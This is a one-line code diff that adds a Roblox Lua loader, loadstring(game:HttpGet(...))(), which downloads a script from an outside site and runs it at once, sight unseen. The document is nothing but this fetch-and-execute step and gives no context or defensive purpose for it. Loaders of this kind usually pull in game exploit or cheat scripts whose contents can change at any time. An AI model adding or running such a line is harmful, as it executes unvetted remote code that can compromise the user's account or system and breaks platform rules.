@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://catgirlhaven.xyz/scripts/site-76.lua"))()
